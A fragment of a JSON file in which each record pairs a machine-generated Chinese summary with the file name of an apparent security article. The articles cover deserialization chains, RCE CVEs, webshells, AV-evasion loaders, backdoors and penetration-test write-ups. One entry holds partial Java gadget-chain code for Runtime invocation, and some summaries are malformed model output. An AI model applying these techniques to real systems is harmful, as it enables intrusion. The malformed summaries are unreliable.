        "page_content": "该文档分析了 JDK7u21 反序列化链的原理和利用方法，该链利用 Java 的动态代理机制和反射机制，通过创建恶意类并将其注入到 TemplatesImpl 对象中，触发 equals() 方法的调用，从而执行命令。",
        "FileName": "8050-JDK7u21反序列化链利用分析.pdf"
    },
    {
        "page_content": "该文档介绍了两个 XSS 漏洞绕过实例，展示了如何利用 nginx 的解析特性、浏览器目录解析规则、JavaScript 注释语句、运算符和正则表达式等知识绕过 XSS 漏洞。",
        "FileName": "11788-一些BAT的XSS实例（六）续集篇.pdf"
    },
    {
        "page_content": "**主题：** TP5 框架中的多个远程代码执行 (RCE) 漏洞分析\n\n**内容：** 文档详细分析了 TP5 框架中五个不同的 RCE 漏洞，包括影响版本、复现环境、漏洞分析和修复方法。这些漏洞涉及路由检查、缓存处理、请求参数处理和表单请求类型伪装等方面，允许攻击者在目标系统上执行任意代码。",
        "FileName": "9369-TP5 漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了 WordPress <= 5.7 中的盲目 XXE 漏洞，该漏洞是由 PHP8 中对 libxml_disable_entity_loader 函数的移除导致的，该函数用于禁用外部实体加载，从而防止 XXE 攻击。漏洞利用涉及构造一个恶意 RIFF 文件，其中包含一个 XML 实体，该实体将加载外部数据并将其发送到攻击者的服务器。",
        "FileName": "9517-分析和学习WordPress=5.7 XXE漏洞.pdf"
    },
    {
        "page_content": "该文档分析了 WebSocket 内存马的利用，包括如何使用 CC 链和 CB 链在 Shiro 中注入恶意类，以及如何绕过 Tomcat 中的限制来注入内存马。",
        "FileName": "12042-反序列化分析到shiro注入WebSocket内存马.pdf"
    },
    {
        "page_content": "好的，我明白了。以下是文档的主题和内容：\n\n**主题：** 分析如下文档并完成以下任务：\n\n**内容：**\n\n```\n1.登录 谭谭 CommonsCollections 的⼆三事 谭谭 CommonsCollections 的⼆三事 fakes0u1   /  2023-02-23 10:56:00  /  发表于⼭东  /  浏览数  5706 Apache Commons Collections 是⼀个扩展了 \t Java \t ​ 标准库⾥的 \t Collection \t ​ 结构的第三⽅基础库，它提供了很多强有⼒的数据结 构类型并实现了各种集合⼯具类，被⼴泛运⽤于各种 \t Java \t ​ 应⽤的开发，⽬前常说的存在缺陷的版本是 \t Apache\tCommons\tCollec tions\t3.2.1 \t ​ 以下（ 4.0 版本也是存在的） 其主要特点如下 Bag - Bag 接⼝简化了每个对象具有多个副本的集合。 BidiMap - BidiMap 接⼝提供双向映射，可⽤于使⽤键或键使⽤的值来查找值。 MapIterator - MapIterator 接⼝为映射提供了简单和易于迭代⽅法。 转换装饰器  -  转换装饰器 (Transforming Decorators) 可以在集合添加到集合时改变集合的每个对象。 复合集合  -  复合集合⽤于要求统⼀处理多个集合的情况。 有序映射  -  有序映射保留元素添加的顺序。 有序集  -  有序集保留元素添加的顺序。 参考映射  -  参考映射允许在密切控制下对键 / 值进⾏垃圾收集。 ⽐较器实现  -  许多⽐较器实现都可⽤。 迭代器实现  -  许多迭代器实现都可⽤。 适配器类  -  适配器类可⽤于将数组和枚举转换为集合。 实⽤程序  -  实⽤程序可⽤于测试测试或创建集合的典型集合理论属性，如联合，交集。   ⽀持关闭。 但是   其中却出现了严重的安全问题 来源于⼀个功能  ——  转换装饰器   可以在集合添加到集合时改变集合的每个对象。（ CVE-2015-4852 ） ⾸先   我们搭建⼀下测试环境  JDK1.7  和  3.1 版本的 CC 包 谭谭 CommonsCollections 的⼆三事 前⾔然后把我们的测试 demo 放进去 import \t org.apache.commons.collections.Transformer ; import \t org.apache.commons.collections.functors.ConstantTransformer ; import \t org.apache.commons.collections.functors.InvokerTransformer ; import \t org.apache.commons.collections.functors.ChainedTransformer ; import \t org.apache.commons.collections.map.TransformedMap ; import \t java.util.HashMap ; import \t java.util.Map ; public \t class \t Test \t { \t\t\t\t public \t static \t void \t main ( String [] \t args ) \t throws \t Exception \t { \t\t\t\t\t\t\t\t Transformer [] \t transformers \t = \t new \t Transformer []{ \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t new \t ConstantTransformer ( Runtime . class ), \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t new \t InvokerTransformer ( \"getMethod\" , \t new \t Class []{ String . class , \t Class []. class }, \t new \t Object []{ \"getRuntime\" , \t new \t Class [ 0 ]}), \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t new \t InvokerTransformer ( \"invoke\" , \t new \t Class []{ Object . class , \t Object []. class }, \t new\n73.```",
        "FileName": "12207-谭谭CommonsCollections的二三事.pdf"
    },
    {
        "page_content": "本文探讨了代理池技术，包括其原理、类型和搭建方法。代理池广泛应用于爬虫、灰产、SEO、网络攻击等领域。不同类型的代理（透明、匿名、混淆、高匿）提供不同的安全级别，而“秒拨”技术则通过频繁切换宽带拨号IP来绕过基于IP的安全防护措施，对防守方带来巨大挑战。",
        "FileName": "7718-说说代理池.pdf"
    },
    {
        "page_content": "该文档介绍了如何逆向分析 JavaScript 前端代码，以解密加密的密码。它提供了详细的分步指南，包括使用 F12 调试工具设置断点、使用 execjs 模块批量加密、导入加密密钥并使用 RSAUtils 库加密密码。该文档还强调了在调试过程中需要注意的细节，例如将加密函数从浏览器代码中提取出来并去除不必要的代码。",
        "FileName": "12460-记某次常规js前端逆向.pdf"
    },
    {
        "page_content": "该文档介绍了 EDR（端点检测与响应）技术，它通过监控、检测和响应端点设备来保护计算机系统免受恶意攻击和数据泄露。EDR 具有持续收集端点数据、实时分析和威胁检测、自动威胁响应、溯源深度处置和支持威胁搜寻和安全加固等功能。此外，文档还介绍了 XDR（扩展检测和响应）、MDR（托管检测和响应服务）以及 OpenEDR（一个开源的网络安全平台）等相关概念。",
        "FileName": "12905-安全设备EDR以及雷池的使用方法.pdf"
    },
    {
        "page_content": "该文档介绍了服务器消息块 (SMB) 协议，包括其版本、消息结构、命令和子命令。SMB 协议用于网络文件共享，在内网渗透中经常使用。文档还提供了在 Windows 服务器中启用/禁用 SMBv1、SMBv2 和 SMBv3 的方法。",
        "FileName": "11971-内网渗透从零到一之SMB协议.pdf"
    },
    {
        "page_content": "该文档详细介绍了域渗透中利用 LDAP 的实战步骤，包括获取 LDAP 信息、使用 LDAP 注入、基于资源的约束委派、域控 DNS 获取、GPO 策略下发等技术，最终获取域管账户并关闭目标机器的防火墙，成功获取 flag。",
        "FileName": "12528-域渗透-How2UseLdap实战.pdf"
    },
    {
        "page_content": "SnakeYaml 库中存在漏洞，可通过反序列化恶意 YAML 数据触发命令执行或 JNDI 注入。漏洞利用过程涉及构造恶意 YAML 数据，其中包含可触发命令执行或 JNDI 注入的 Java 对象。通过禁用 YAML.load() 方法中的参数可控或使用 SafeConstructor 来限制反序列化的类，可以修复此漏洞。",
        "FileName": "12783-Java安全之SnakeYaml漏洞分析与利用.pdf"
    },
    {
        "page_content": "该文档介绍了 HarmonyOS 和 HMS 专场 CTF 中的两个 Risc-V Pwn 题目，分析了 Risc-V 的函数调用规则和指令集，并提供了利用栈溢出和堆溢出漏洞的详细解题步骤。",
        "FileName": "8977-HarmonyOS和HMS专场CTF Risc-V Pwn题解.pdf"
    },
    {
        "page_content": "该文档主要介绍了 AWD（Attack with Defense）比赛的规则、术语和常见思路。它涵盖了登录、靶机操作、MySQL 备份、代码审计、权限维持、脚本部署、文件监控、代码执法、文件遍历、不死马、定时任务、宕机、Wireshark 基础用法等方面的内容。",
        "FileName": "10342-关于Awd的小结.pdf"
    },
    {
        "page_content": "**主题：** Firefox 中通过 CSS 单一注入点进行数据泄露\n\n**内容：** 该文档描述了一种在 Firefox 中通过 CSS 单一注入点泄露数据的技术，该技术利用了 HTTP/2 多路传输功能来绕过并发 TCP 连接限制，从而快速泄露整个令牌。该技术需要将 @import 规则分别放置在不同的样式表中，以防止后续导入阻止整个样式表的处理。",
        "FileName": "7362-Firefox中单一注入点上的CSS数据泄露.pdf"
    },
    {
        "page_content": "DNSStager 是一款工具，它利用 DNS 隐藏多段 shellcode，通过多次 DNS 查询请求加载 shellcode 内容并上线。它通过创建伪造的 DNS 服务器，解析伪造的 AAAA 和 TXT 记录，呈现编码/加密的有效负载，供代理使用。DNSStager 要求禁用 systemd-resolved 服务，安装 ming-w64 和 GoLang 依赖项，并配置域名和 NS 记录。它提供多种负载选项，如 x64/c/ipv6、x86/c/ipv6、x64/golang/txt 等，并使用 XOR 加密程序运行，具有免杀功能。",
        "FileName": "9621-DNSStager-DNS分离shellcode新玩具.pdf"
    },
    {
        "page_content": "本文档介绍了一种通过遍历抽象语法树 (AST) 来解决 SCTF 2021 FUMO_on_the_Christmas_tree 挑战的方法。该方法涉及构建调用图，分析变量状态，并查找从源（__destruct 函数）到汇（readfile 函数）的路径，以利用 PHP 代码中的漏洞。",
        "FileName": "10755-通过遍历AST来解 SCTF 2021 FUMO_on_the_Christmas_tree.pdf"
    },
    {
        "page_content": "本文介绍了一种通过 XXE 漏洞在 HTTP Out of Band 不可用的情况下泄露本地文件的方法。该方法利用本地 DTD 技术，通过覆盖可注入实体来实现文件读取，并通过 OOB 技术在外部 DTD 中写入内容。通过这种方式，即使没有已知的 RCE 漏洞，也可以利用 XXE 漏洞在服务器上读取文件。",
        "FileName": "9505-当HTTP OOB失败时，如何通过XXE泄露本地文件.pdf"
    },
    {
        "page_content": "本文档重点介绍了 PHP 原生类在 CTF 题目中的应用，包括 XSS、反序列化、SSRF、XXE 和文件读取。它详细分析了 Error、Exception、SoapClient、DirectoryIterator、FilesystemIterator、SplFileObject、SimpleXMLElement、ZipArchive、ReflectionMethod 等类的内置方法和特性，并提供了利用这些类进行攻击的示例代码和 POC。",
        "FileName": "11161-浅析php原生类.pdf"
    },
    {
        "page_content": "该文档分析了 Tomcat 服务器中 Servlet 的内存马利用技术，详细介绍了 Servlet 的生命周期、配置和加载过程，并提供了利用反射修改 Servlet 的加载优先级和映射 URL 路径的示例代码，以实现内存马注入。",
        "FileName": "12629-Servlet内存马利用分析.pdf"
    },
    {
        "page_content": "该文档主要介绍了HTTP报文结构、CRLF注入漏洞的原理、利用CRLF注入漏洞进行SSRF攻击的几种方法，以及如何利用Node.js中的Unicode字符损坏漏洞进行CRLF注入攻击。",
        "FileName": "12387-CRLF injection.pdf"
    },
    {
        "page_content": "该文档主要介绍了如何使用 Ghidra Processor 创建教程，将汇编代码翻译为伪代码。通过定义 P-code 指令，Ghidra 可以根据生成的 P-code 指令生成伪 C 代码。文档详细介绍了如何定义 mov、算术、分支、栈操作和 syscall 指令的 P-code，并提供了完整的 P-code 定义。",
        "FileName": "10417-Ghidra-Processor创建教程——从汇编代码到伪代码.pdf"
    },
    {
        "page_content": "这篇文档分析了如何通过审计学习 PHP 对象注入，从功能分析到漏洞探测、分析和利用。它详细介绍了如何利用 PHP 对象注入漏洞，包括伪造任意对象、重命名文件和删除 .htaccess 文件，最终获得服务器权限。",
        "FileName": "7849-一道CTF来审计学习PHP对象注入.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2020-1472（“Zerologon”）漏洞，该漏洞允许攻击者通过 NetLogon 协议将域控服务器的密码置为空，从而控制域控服务器。文档介绍了漏洞原理、复现步骤、威胁狩猎规则，并提供了缓解措施，强调及时打补丁的重要性。",
        "FileName": "8367-ZeroLogon(CVE-2020-1472) 分析与狩猎.pdf"
    },
    {
        "page_content": "该文档记录了一次授权渗透测试，其中通过爆破获得了管理员密码，并利用 ThinkCMF 建站系统漏洞和 MySQL 弱密码爆破获得了 getshell。此外，还发现了登录 IP 伪造和越权漏洞等其他漏洞。",
        "FileName": "10460-记一次授权的渗透测试.pdf"
    },
    {
        "page_content": "该文档讨论了 Fastjson .NET 中的反序列化漏洞，该漏洞允许攻击者通过控制 JSON 输入来执行任意代码。文档提供了示例代码，说明如何利用该漏洞，并解释了 Fastjson 2.3.0 及更高版本中引入的缓解措施，包括黑名单检查。文档强调了关注 Fastjson 版本和控制 JSON 输入的重要性，并指出 Fastjson 逐渐被 JSON.NET 取代，但仍然是一个经典的反序列化漏洞，值得学习。",
        "FileName": "9604-.net反序列化之Fastjson.pdf"
    },
    {
        "page_content": "该文档分析了 Undertow URL 解析特性及其安全问题，重点关注了 Tomcat 和 Undertow 在处理包含分号的 URL 时不同的解析逻辑。在 Tomcat 中，分号被删除，而 Undertow 将分号作为分隔符，导致 Filter 和 Controller 对 URL 的解析不一致，可能导致未授权访问。",
        "FileName": "7244-Undertow URL解析特性及其安全问题.pdf"
    },
    {
        "page_content": "该文档详细介绍了 CVE-2020-11108 漏洞，该漏洞影响 Pi-hole v4.4 及更低版本，允许认证用户通过远程代码执行和提权来控制 Pi-hole 主机。漏洞利用涉及通过 Pi-hole Web 应用程序向特定 URL 发送精心设计的请求，从而在 Web 目录中写入恶意 PHP 文件，然后通过 sudo 规则执行该文件来提升权限。",
        "FileName": "7781-CVE-2020-11108 How I Stumbled into a Pi-hole RCE+LPE.pdf"
    },
    {
        "page_content": "CVE-2023-21839 漏洞是一个 Weblogic 的 JNDI 注入漏洞，它利用了 Weblogic 远程绑定对象机制，通过远程绑定恶意对象并对其进行查询来触发漏洞函数，从而实现 JNDI 注入。该漏洞与 CVE-2020-2551 类似，但不同之处在于它可以使用 t3 或 iiop 协议，并且通过查询恶意对象来触发漏洞函数，而不是通过序列化和反序列化过程。",
        "FileName": "12297-CVE-2023-21839分析.pdf"
    },
    {
        "page_content": "该文档介绍了 PHP 中的无参数远程代码执行 (RCE) 漏洞，并提供了利用该漏洞的多种方法，包括使用 getenv()、getallheaders()、get_defined_vars()、scandir() 和 chdir() 等函数。文档还讨论了如何使用 session_start() 和 swp 源码泄露来获取源代码。",
        "FileName": "9360-PHP的无参数RCE.pdf"
    },
    {
        "page_content": "本文探讨了 FreeIPA 环境中的信息枚举技术，包括通过 LDAP 和 IPA 管理工具枚举主机、用户、组、HBAC 规则、Sudo 规则和基于角色的访问控制。这些技术对于攻击者了解环境并识别攻击路径至关重要。",
        "FileName": "7869-攻击 FreeIPA 第二章：信息枚举.pdf"
    },
    {
        "page_content": "该文档分析了一个 webvpn 系统的登录过程，该系统使用 AES-CFB 加密算法对 URL 进行加密。通过分析 JavaScript 代码和抓取 API 请求，作者确定了加密密钥和 IV，并展示了如何使用这些信息解密加密的 URL。作者还讨论了如何使用脚本对目标内网中的 HTTP 服务进行爆破。",
        "FileName": "11007-对某webvpn系统加解密分析.pdf"
    },
    {
        "page_content": "**文档主题：** Java 反序列化之 CC 调⽤链过程 1-7 探究详解\n\n**文档内容：**\n\n**1. 登录 Java 反序列化之 CC 调⽤链过程 1-7 探究详解**\n\n**2. 用一段话概括文档**\n\nJava 反序列化漏洞利用 CC 调⽤链过程 1-7 探究详解，涉及 CommonsCollections 1、3、4、5、6、7 版本，通过分析漏洞原理、调⽤链、EXP 实现，深入理解 Java 反序列化漏洞利用技术。\n\n**3. 分析文档的主题和内容**\n\n**主题：** Java 反序列化之 CC 调⽤链过程 1-7 探究详解\n\n**内容：**\n\n* **漏洞原理：** Java 反序列化漏洞利用原理\n* **调⽤链：** CC 调⽤链过程 1-7\n* **EXP 实现：** 各版本 EXP 实现详解\n\n**4. 提取文档中的关键信息**\n\n* **漏洞类型：** Java 反序列化漏洞\n* **漏洞版本：** CommonsCollections 1、3、4、5、6、7\n* **调⽤链：** 涉及 Transformer、InvokerTransformer、LazyMap、TiedMapEntry 等类\n* **EXP 实现：** 利用 Runtime.getRuntime().exec(\"calc\") 执行命令\n\n**5. 总结文档**\n\n该文档详细介绍了 Java 反序列化之 CC 调⽤链过程 1-7 的探究详解，通过分析漏洞原理、调⽤链、EXP 实现，帮助读者深入理解 Java 反序列化漏洞利用技术。",
        "FileName": "12692-Java反序列化之CC调用链过程1-7探究详解.pdf"
    },
    {
        "page_content": "该文档详细描述了一个渗透测试人员如何通过前台 SQL 注入、绕过 WAF、后台文件上传、反弹 shell、升级 shell 和利用内核漏洞 CVE-2012-0056 成功获取目标服务器的 root 权限。",
        "FileName": "8182-渗透实战  简单的拿下项目的root权限.pdf"
    },
    {
        "page_content": "该文档介绍了一个使用 Python 编写的批量 Web 存活探测脚本，该脚本从文件中读取 URL，去除重复项，并使用 HTTP 和 HTTPS 协议发送请求。它根据响应状态码判断 URL 是否存活，并将结果保存到不同的文件中，具体分类为 200、300、400 和 500 状态码。该脚本使用多线程来提高执行速度，并使用进度条显示执行进度。",
        "FileName": "12470-【工具开发】Python批量web存活探测脚本.pdf"
    },
    {
        "page_content": "本文探讨了自治系统号 (ASN) 在信息收集中的作用，ASN 是一个唯一标识符，用于标记自治系统并允许其与其他系统交换路由信息。通过 ASN，可以了解目标网络资产的范围，并确定目标是否拥有自己的 ASN 编号或使用云服务提供商的 ASN。本文还提供了使用 ASN 进行信息收集的实际示例，并强调了 ASN 在特定场景中的有效性，例如目标拥有自己的 ASN 编号和管理的外部 IP 地址。",
        "FileName": "9455-浅析ASN在信息收集中的作用.pdf"
    },
    {
        "page_content": "该文档详细描述了作者对一个赌博网站进行渗透测试的过程，包括利用 SQL 注入漏洞获取数据库信息、扫描端口发现管理登录地址、利用目录扫描发现注入点、尝试写入 shell 失败、通过读取配置文件获取管理员密码、登录后台、利用 thinkphp 漏洞写入 shell、打包源码等步骤，最终成功获取了网站的控制权。",
        "FileName": "9567-赌博站人人得而诛之.pdf"
    },
    {
        "page_content": "WordPress Real-Time Find and Replace 插件存在 CSRF 到存储型 XSS 漏洞，攻击者可利用此漏洞通过恶意代码替换目标网站页面上的任何内容，该漏洞影响超过 100,000 个网站，成因是插件管理页面未校验 CSRF 令牌。",
        "FileName": "7717-WordPress Real-Time Find and Replace插件CSRF to Stored XSS漏洞分析.pdf"
    },
    {
        "page_content": "本文档探讨了智能合约开发中常见的变量覆盖和不一致性检查问题。它介绍了未初始化的存储指针和数组局部变量的问题，并提供了解决这些问题的正确方法。此外，本文档还强调了在转账操作中进行一致性检查的重要性，并提供了不一致性检查漏洞的示例。",
        "FileName": "7152-智能合约审计系列————3、变量覆盖&不一致性检查.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2018-12613 漏洞，该漏洞存在于 phpMyAdmin 中，允许攻击者通过文件包含来执行任意代码。漏洞的根源在于对用户输入的验证不充分，导致攻击者可以绕过白名单检查并包含恶意文件。文档提供了漏洞的详细技术分析，包括利用 payload 和缓解措施。",
        "FileName": "7553-记一次CVE-2018-12613的题目复现.pdf"
    },
    {
        "page_content": "本文探讨了由定界符引发的安全问题，包括绕过验证、提升权限、SQL注入和拒绝服务攻击。定界符是限制界限的符号，在不同语言中形式多样，但其广泛使用也带来了安全漏洞。通过分析实例，本文强调了对定界符进行严格检查和过滤的重要性，以防止恶意攻击。",
        "FileName": "7546-由定界符引发的一些安全问题.pdf"
    },
    {
        "page_content": "**主题：** CNVD-2021-16864 漏洞复现分析\n\n**内容：** 该文档详细介绍了如何利用狂雨 CMS 中的远程代码执行 (RCE) 漏洞 (CNVD-2021-16864)，该漏洞是由 ThinkPHP 框架中的可控反序列化输入点造成的。文档提供了漏洞利用的步骤、代码分析和利用数据包，并强调了漏洞产生的原因和利用方法。",
        "FileName": "9756-CNVD-2021-16864 某雨cms前台rce复现分析.pdf"
    },
    {
        "page_content": "该文档介绍了如何在 ARM M2 环境下配置 Pwn 环境，包括安装必要的工具和软件，如 QEMU、Proxychains、Pwndbg 和 Zsh。它还提供了配置 SSH 免密码登录的步骤，并提供了百度网盘链接以下载 Safe-linking 工具。",
        "FileName": "12694-arm m2 下 pwn 环境配置.pdf"
    },
    {
        "page_content": "该文档介绍了如何绕过 Weblogic IIOP 协议的 NAT 网络，重点介绍了使用 GIOP 协议极简实现和 Javassist 字节码库修改原始代码这两种方法。",
        "FileName": "8508-Weblogic IIOP 协议NAT 网络绕过.pdf"
    },
    {
        "page_content": "该文档详细介绍了研究人员如何利用 Lucee CMS 中的配置错误和 Apple WAF 的行为，在 Apple 的服务器上获得远程代码执行权限。研究人员利用了 imgProcess.cfm、admin.search.index.cfm 和 ext.applications.upload.cfm 中的漏洞，最终在 https://facilities.apple.com 上获得了 webshell。",
        "FileName": "9121-挖掘0day来入侵Apple.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 D-Link DIR-816 A2 路由器中 goahead 程序的漏洞，通过修改寄存器值绕过登录验证，最终触发 datetime 参数中的 shell 元字符，在系统上执行任意命令。",
        "FileName": "9394-D-Link路由器漏洞研究分享.pdf"
    },
    {
        "page_content": "本文分析了主流 WebShell 工具（蚁剑、冰蝎、哥斯拉）的流量层加密机制，包括编码器、RSA 加密、AES 加密、异或加密和 Base64 编码等技术。通过分析代码和流量，揭示了这些工具的加密流程和特征，为安全研究人员和渗透测试人员提供了深入了解 WebShell 加密机制的宝贵信息。",
        "FileName": "9404-主流WebShell工具流量层分析.pdf"
    },
    {
        "page_content": "该文档分析了某 OA 系统中的前台任意文件上传漏洞，该漏洞存在于集群模式下，利用条件苛刻。漏洞利用过程涉及绕过 IP 地址和 token 检查，上传恶意 ZIP 文件，触发解压缩操作，最终上传 JSP 文件。检测思路是通过检测上传接口来判断目标是否配置了集群模式，修复方案是升级补丁或拦截对相关接口的访问。",
        "FileName": "12750-某OA前台任意文件上传分析.pdf"
    },
    {
        "page_content": "该文档介绍了一种最简单的加载器免杀思路，通过变量混淆和插入无效指令来伪装加载器，为后续的免杀奠定基础。该思路通过编写随机变量生成函数和随机空指令函数，将加载器模板中的变量和指令替换为随机字符串和指令，从而生成一个新的加载器文件，使其不易被杀软检测。",
        "FileName": "9385-最简单的加载器免杀思路.pdf"
    },
    {
        "page_content": "本文分析了Tomcat中Connector组件的实现，重点关注了Http11NioProtocol的实现。通过分析Endpoint、Acceptor、Poller、SocketProcessor和Executor等组件，阐述了Tomcat如何接收和处理连接请求。此外，文章还介绍了如何利用Executor实现恶意代码注入，并通过AES加密实现通信的隐蔽性。",
        "FileName": "11593-Executor内存马的实现.pdf"
    },
    {
        "page_content": "本文介绍了如何使用 Metasploit Framework (MSF) 生成和植入后门，包括 Linux、Windows、PHP、Android 和其他类型的后门。它提供了详细的分步说明，包括生成后门、将其传输到目标主机、运行后门并获取 shell 访问权限。该文档还列出了生成不同类型后门的 MSFvenom 命令，并提供了参考文章的链接。",
        "FileName": "8337-初识MSF后门技术.pdf"
    },
    {
        "page_content": "该文档分析了网络贷款诈骗的运作方式，包括诈骗短信、诈骗过程、漏洞分析、客服系统控制和闪存钓鱼等技术手段。诈骗者通过虚假贷款信息诱骗受害者缴纳保证金、保险费等费用，导致受害者钱款被骗。",
        "FileName": "10391-针对网贷诈骗行业诈骗链分析.pdf"
    },
    {
        "page_content": "该文档介绍了使用 Pandas 库进行数据分析，包括数据加载、预处理、数据结构、常用函数、缺失值检查和处理、描述性统计分析、数据修改和筛选、重复值检查和处理以及其他分析工具。",
        "FileName": "12541-Pandas数据分析.pdf"
    },
    {
        "page_content": "该文档分析了 NSA 的 Emissary 项目中的 SSRF 漏洞 (CVE-2021-32639)，该漏洞允许攻击者通过伪造请求将 HTTP 请求发送到攻击者控制的服务器，从而可能泄露服务器凭证。",
        "FileName": "10045-分析Emissary 的SSRF漏洞(CVE-2021-32639).pdf"
    },
    {
        "page_content": "该文档介绍了 FireEye 高级逆向工程团队开发的 IDApython 库 flare-emu，该库将 IDA Pro 的二进制分析功能与 Unicorn 仿真框架相结合，为用户提供了易用且灵活的脚本编写仿真模拟接口。flare-emu 旨在处理所有内务处理，为其支持的体系结构设置灵活而强大的仿真器，以便用户专注于解决代码分析问题。",
        "FileName": "7760-用模拟执行实现Objective-C代码自动化分析.pdf"
    },
    {
        "page_content": "**主题：** Thinkphp v6.0.13 反序列化漏洞 (CVE-2022-38352) 分析\n\n**内容：** 该漏洞存在于 Thinkphp v6.0.13 中，攻击者可以通过精心构造的请求触发反序列化漏洞，从而在目标服务器上执行任意代码。漏洞利用 League\\Flysystem\\Cached\\Storage\\Psr6Cache 类的 __destruct() 方法，通过调用 think\\log\\Channel 类的 __call() 方法，最终利用 think\\view\\driver\\Php#display() 方法实现远程代码执行。",
        "FileName": "12169-Thinkphp v6.0.13反序列化(CVE-2022-38352)分析.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Shiro 中的 PaddingOracle 漏洞，该漏洞允许攻击者通过 padding oracle 攻击获取随机密钥，从而反序列化 RememberMe cookie 并执行任意代码。漏洞利用条件包括能够登录、找到使用 RememberMe 的接口以及能够执行 padding oracle 攻击。文档还提供了利用该漏洞的示例，包括使用本地环境和 RuoYi CMS。",
        "FileName": "7026-Apacha-Shiro PaddingOracle 分析.pdf"
    },
    {
        "page_content": "本文介绍了 DLL 劫持注入技术，包括原理、加载优先规则和漏洞挖掘。作者使用 X64Dbg、ChkDllHijack 和 AheadLib+ 工具对腾讯 QQ 进行漏洞挖掘，并利用 AheadLib+ 生成了劫持代码，成功在 QQ 中注入 shellcode 并上线 Cobalt Strike。",
        "FileName": "11711-Dll劫持注入从原理到白加黑漏洞利用.pdf"
    },
    {
        "page_content": "该文档分析了 Netgear R9000 设备中一个被低估的认证前漏洞 (CVE-2019-20760)，该漏洞允许攻击者仅凭设备 IP 即可获得设备的最高控制权，影响范围广泛，包括 R9000、R7800 和 R7500 等型号，且受影响设备数量众多。",
        "FileName": "9125-危害被低估的Netgear认证前漏洞CVE-2019-20760分析.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Node.js 的基础知识，包括登录、JavaScript 的原理、Node.js 的基础、文件系统模块、路径模块、HTTP 模块、客户端和服务器的概念、Express 框架、中间件、路由、跨域请求等内容。",
        "FileName": "12445-Node.js攻略.pdf"
    },
    {
        "page_content": "DOM Clobbering 是一种通过在网页中插入 HTML 代码来改变 JavaScript 中全局变量或对象属性含义的技术，从而永久改变 JavaScript 执行结果。它利用了 HTML 集合的存在，允许构造层级结构的全局变量或对象属性引用，从而破坏目标网页中脚本的执行结果，包括破坏对象引用和属性引用。",
        "FileName": "7346-DOM Clobbering详解.pdf"
    },
    {
        "page_content": "本文探讨了二进制漏洞攻击，这是一种网络安全领域，涉及发现和利用程序中的漏洞以获得对程序的控制或修改其功能。文章重点介绍了基于堆和基于栈的缓冲区溢出，并通过示例代码演示了如何利用这些漏洞来执行任意代码或修改程序行为。此外，文章还介绍了shellcode的概念，即远程注入的代码，可用于控制受影响的系统。",
        "FileName": "12300-绘画二进制0x000001攻击的艺术 【基于栈的溢出】.pdf"
    },
    {
        "page_content": "该文档分析了如何绕过 HTTP 包 WAF，重点介绍了 PHP 中 rfc1867_post_handler 函数在处理 multipart/form-data 数据时的具体实现。通过分析该函数的代码，可以了解到 PHP 如何解析 Content-Disposition 头部，提取 name 和 filename 等关键信息，并将其存储到相应的变量中。",
        "FileName": "9432-记一次刨根问底的HTTP包WAF绕过.pdf"
    },
    {
        "page_content": "该文档介绍了一种利用 Windows 自带工具 Certutil 进行文件编码和解码的骚操作，以绕过低权限和杀毒软件的限制，实现文件上传。通过将文件内容编码为文本，写入服务器后，再在服务器上解码，可以执行编码后的文件，从而绕过杀毒软件的拦截。",
        "FileName": "8930-文件上传的一个骚操作(低权限+bypassAV).pdf"
    },
    {
        "page_content": "该文档主要讨论了各种常见的 Web 应用程序漏洞，并提供了相应的修复方案，包括 SQL 注入、反序列化、文件包含、代码执行、XSS 和 CSRF 等漏洞。",
        "FileName": "12660-各类漏洞FIX方案.pdf"
    },
    {
        "page_content": "uhttpd 是物联网设备中常见的 Web 服务器，其源码分析有助于理解其他厂商开发 Web 服务器的流程，从而提高物联网漏洞挖掘效率。该文档介绍了 uhttpd 的主函数、信号处理、配置文件解析、默认主页和 CGI 绝对路径初始化、插件初始化、运行服务器等功能。",
        "FileName": "9543-物联网设备常见的web服务器——uhttpd源码分析（一）.pdf"
    },
    {
        "page_content": "该文档详细介绍了 CVE-2016-5734 phpMyAdmin 后台代码执行漏洞，该漏洞利用了 preg_replace() 函数中的 /e 修正符，允许攻击者在 phpMyAdmin 中执行 PHP 代码。文档提供了漏洞概述、影响版本、环境搭建、漏洞复现步骤、漏洞触发点、修复方法以及参考链接。",
        "FileName": "7836-CVE-2016-5734 phpmyadmin后台代码执行漏洞复现.pdf"
    },
    {
        "page_content": "这篇文档详细介绍了 SQL 注入和 RCE（远程命令执行）漏洞，包括数字型注入、字符型注入、搜索型注入、xx 型注入、insert/update 注入、delete 注入、http header 注入、盲注、宽字节注入、远程系统命令执行和远程代码执行。文档强调了这些漏洞的危害性，并提供了预防和利用这些漏洞的策略和技术。",
        "FileName": "12051-Pikachu靶场SQL-Inject和RCE学习分享.pdf"
    },
    {
        "page_content": "该文档介绍了使用 ANGR 符号执行框架解决一系列逆向工程挑战的教程，包括设置正确地址、避免复杂函数、使用函数输出作为搜索条件、将符号向量存储在寄存器和栈中，以及内存符号化。",
        "FileName": "12676-ANGR符号执行.pdf"
    },
    {
        "page_content": "该文档总结了绕过 MySQL 注入保护的各种技术，包括使用注释符、空白符、科学计算法、单引号和双引号、x@、{x key}、其他字符、函数、ALL | DISTINCT | DISTINCTROW、函数分隔、{} ()、符号、组合、反引号、花括号、\\N、单双引号、e、组合、空白符、注释、花括号、FUZZ Python 脚本。",
        "FileName": "8490-MySQL绕过小结.pdf"
    },
    {
        "page_content": "该文档记录了一次对某 CMS 代码的审计过程，通过分析代码，审计人员发现了一个文件上传漏洞，该漏洞允许攻击者上传任意文件，包括恶意脚本，从而获得对系统的控制权。审计人员通过修改上传请求中的参数，成功上传了一个 JSP Webshell，并获得了对系统的命令执行能力。",
        "FileName": "11774-记一次某CMS代码审计.pdf"
    },
    {
